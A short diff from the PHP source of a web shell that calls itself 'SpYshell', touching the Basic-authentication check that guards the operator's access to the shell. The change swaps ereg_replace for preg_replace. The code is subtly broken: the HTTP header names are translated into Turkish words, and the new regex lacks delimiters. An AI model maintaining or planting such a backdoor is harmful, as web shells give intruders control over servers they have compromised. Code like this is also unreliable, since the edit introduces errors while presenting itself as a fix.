@@ -206,7 +206,7 @@ if (!empty($login))
  if (empty($md5_pass)) {$md5_pass = md5($pass);}
  if (($_SERVER["PHP_AUTH_USER"] != $login) or (md5($_SERVER["PHP_AUTH_PW"]) != $md5_pass))
  {
-  if (empty($login_txt)) {$login_txt = strip_tags(ereg_replace("&nbsp;|<br>"," ",$donated_html));}
+  if (empty($login_txt)) {$login_txt = strip_tags(preg_replace("&nbsp;|<br>"," ",$donated_html));}
   header("WWW-Belgele: Basic realm=\"SpYshell ".$shver.": ".$login_txt."\"");
   header("HTTP/1.0 401 Yetkisiz");
   exit($accessdeniedmess);
